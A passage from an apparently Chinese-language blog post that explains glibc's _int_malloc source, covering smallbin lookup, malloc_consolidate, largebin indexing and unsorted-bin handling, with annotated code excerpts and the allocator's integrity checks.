SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先判断它在不在<code>small bin</code>的范围内，然后取出这个<code>size</code>的<code>small bin</code>的最后一个<code>chunk</code>。它添加是在头部添加的，因此是符合先进先出的，嗯。然后需要判断，如果最后一个chunk!=自身的话，两个情况：要么没初始化<code>arena</code>，那就初始化，要么它有一个合法的块。如果它指向自身那就没必要做过多的判断了，没有这个大小的<code>small bin</code>。</p><p>这里是调用了<code>malloc_consolidate</code>函数去初始话这个<code>arena</code>分配器，该函数逻辑如下，不重点解读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span><span class="function">mlined version of consolidation code in <span class="title">free</span><span class="params">()</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    maxfb </span>= &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是清空所有<code>arena</code>的<code>chunk</code>，可以看到大的<code>if</code>是判断<code>global_max_fast</code>是否为0，为0则初始化，调用<code>malloc_init_state</code>和<code>check_malloc_state</code>函数初始化堆。否则把所有的<code>fast bin</code> 取出来，先清除它们的标志位，然后扔到<code>unsorted bin</code>中尝试向前合并或者向后合并。</p><p>这个呢，不太能运行到，因为<code>victim==0</code>的时候，必还没初始化，没初始化到这里就要初始化，初始化了之后<code>victim</code>又不可能<code>=0</code>了，所以这里可以理解为就是初始化<code>arena</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><p>这里判断了一下<code>victim-&gt;bk-&gt;fd==victim</code>。也就是当前这个堆块后一个堆块的<code>fd</code>指针是否指向<code>victim</code>，如果不等说明链表被破坏了，那么就报错退出。</p><p>然后<code>set_inuse_bit_at_offset</code>，这个也不难理解，因为现在这个<code>small bin</code>被取出来了要使用了，所以我得设置后一个块的<code>prev_inuse</code>为1证明它不是空闲堆块了。然后就是进行<code>unlink</code>操作，对链表熟悉的同学应该看得懂。如果我要删除<code>victim</code>元素那应该怎么写逻辑？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd-&gt;bk=victim-&gt;bk;</span><br><span class="line">victime-&gt;bk-&gt;fd=victim-&gt;fd;</span><br></pre></td></tr></table></figure><p>在这里呢，我们取链的最后一个<code>chunk</code>，也就是<code>bin-&gt;bk=victim</code>所以<code>victim-&gt;fd=bin</code></p><p>然后前面有一个赋值就是<code>bck=victim-&gt;bk</code>。带进上面的式子就得到了源码里面这样的写法。</p><p>然后下面设置<code>main_arena</code>标志位，一波同样的<code>check</code>，然后返回内存指针。也就是这里的<code>chunk2mem</code>，我们这里用的<code>chunk</code>指针，但是其实我们要返回的应该是<code>chunk</code>中数据域的指针，所以这里用了这样的宏定义做替换。</p><p>然后就是清除<code>data</code>数据，但是这个一般不会被执行，前面也分析过了，然后返回。这是<code>small bin</code>找到对应的<code>chunk</code>的逻辑，如果<code>small bin</code>还没找到那么接下来应该要去找<code>large bin</code>了，那么我们接着往下读。</p><h3 id="第四段：分配largebin时的操作"><a href="#第四段：分配largebin时的操作" class="headerlink" title="第四段：分配largebin时的操作"></a>第四段：分配largebin时的操作</h3><p>那么如果没有在small bin的范围内呢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较耐人寻味。</p><p>先获取<code>large bin</code>的<code>index</code>，然后如果<code>fast bin</code>不为空，调用<code>malloc_consolidate</code>。这一步是什么意思呢？我们前面分析过<code>malloc_consolidate</code>，如果没有初始化，那么初始化，如果初始化了，那么合并所有的<code>fast bin</code>。但是这里，都已经有<code>fast bin</code>存在了，那么堆指定已经初始化了，所以这里执行的逻辑基本只能是合并所有<code>fast chunk</code>。为什么要在搜索<code>large bin</code>的时候合并所有<code>fast bin</code>呢？因为<code>large bin</code>的匹配方式是最小能满足，然后切割。</p><p>考虑这样一种情况：</p><p>如果一个<code>0x20</code>的<code>fast bin</code>和0x500的<code>large bin</code>物理相邻。此时我要申请一个<code>0x510</code>的<code>large bin</code>，如果此时<code>fast bin</code>被合并了，那么我就能找到一个<code>0x520</code>的<code>large bin</code>并把它返回给用户。如果我不做这一步，那么我找不到<code>0x510</code>大小的<code>large bin</code>，我就被迫只能切割<code>top_chunk</code>了，这样子就浪费了很大的一块内存。</p><p>那么这个会不会有多此一举的时候呢，也是会的，还是刚刚那种情况，假如我申请<code>0x500</code>的<code>chunk</code>。这样子合并之后又会被切割，那么这样子，之前的合并就显得多次一举了，但是它只是浪费了一部分时间开销，内存分配上还是执行上面的逻辑比较占优势。所以这一步可以理解为空间上的优化，但是牺牲了小部分时间。看不来的话可以多看看上面举得例子。</p><h3 id="第五段：large-bin和unsorted-bin的相爱相杀"><a href="#第五段：large-bin和unsorted-bin的相爱相杀" class="headerlink" title="第五段：large bin和unsorted bin的相爱相杀"></a>第五段：large bin和unsorted bin的相爱相杀</h3><p>这里开始逻辑都混合起来了，不仅有<code>large bin</code>，unsorted bin，切割<code>top_chunk</code>，还有系统调用重新分配<code>top_chunk</code>。</p><h4 id="第1小块"><a href="#第1小块" class="headerlink" title="第1小块"></a>第1小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           ......</span><br><span class="line">         &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先外面套了一个<code>while(1)</code>，然后里面有一个<code>while</code>循环，判断内容就是取得最后一个<code>unsorted chunk</code>是否与这个<code>bin</code>相等，这里大概就是开始遍历<code>unsorted chunk</code>了。</p><p>然后这里又有一个<code>check</code>。<code>victim-&gt;size &lt;= 2 * SIZE_SZ</code>就是说<code>chunk</code>的<code>size</code>小于等于<code>0x10</code>，<code>victim-&gt;size &gt; av-&gt;system_mem</code>就是说我一个块的<code>size</code>居然比我系统调用申请来的内存都多，那这肯定不合理啊，所以任意满足一个就会报错了。</p><h4 id="第二小块"><a href="#第二小块" class="headerlink" title="第二小块"></a>第二小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有四个条件：</p><ol><li><code>in_smallbin_range (nb)</code>：申请<code>small bin</code>范围内的<code>chunk</code></li><li><code>bck == unsorted_chunks (av)</code>：<code>bck=victim-&gt;bk=unsorted_chunks(av)-&gt;bk-&gt;bk</code>，也就是说<code>unsorted_chunks (av)-&gt;bk-&gt;bk=unsorted_chunks (av)</code>，翻译一下差不多就是<code>unsorted bin中</code>只有一个<code>chunk</code>。</li><li><code>victim == av-&gt;last_remainder</code>：就是说这个chunk刚好是最近被分割过的剩余部分。</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>：保证我找到的这个<code>chunksize</code> &gt; 需要的最小块+<code>MINSIZE</code>。为了保证等会我切割出<code>nb size</code>之后剩余的<code>chunk</code>能&gt;<code>MINSIZE</code>，这里我也不知道为什么不能等于，可能解读哪里有误吧，如果您知道请帮我勘误一下，谢谢了。</li></ol><p>然后接下来就是切割<code>victim</code>，切割出一块刚刚好大小的<code>chunk</code>给用户，切割出来的<code>chunk</code>作为新的<code>av-&gt;last_remainder</code>，注意如果切割剩余的<code>chunk size</code>不符合<code>small bin</code>的大小，则<code>fd_nextsize</code>和<code>bk_nextisze</code>会被清空，因为剩余的的<code>chunk</code>会被放到<code>unsorted bin</code>当中。</p><p>然后设置<code>victim</code>的<code>size</code>为<code>nb|PREV_INUSE</code>，然后判断是否为主分配加上标记。</p><p>然后把remainder的<code>prev_inuse</code>位设置为1，因为前一个块已经被拿走使用了，所以这个<code>prev_inuse</code>要设置为1。</p><p>然后因为<code>remainder</code>的<code>size</code>发生了改表，所以下一个<code>chunk</code>的<code>prev_size</code>也要相应地改变。</p><p>剩下的前面类似的都讲过就不赘述了。</p><h4 id="第三小块"><a href="#第三小块" class="headerlink" title="第三小块"></a>第三小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否则会先取出这最后一个<code>chunk</code>，把它移除<code>unsorted bin</code>。如果取出的这个<code>size</code>刚好等于这个<code>nb</code>，那就说明这个块一定是最合适的，直接把它返回了，不要迟疑。如果并不是最合适呢，那么先会判断一下它是否属于<code>small bin</code>，属于则执行以下的逻辑，把<code>bck</code>对应<code>bin</code>的<code>bk</code>，<code>fwd</code>为对应<code>bin</code>的<code>fd</code>，也就是找到那一对<code>bin</code>，<code>fwd</code>在前，<code>bck</code>在后。就没了，预计等会就要用这些指针把<code>chunk</code>链进去了。</p><h4 id="第四小块"><a href="#第四小块" class="headerlink" title="第四小块"></a>第四小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span 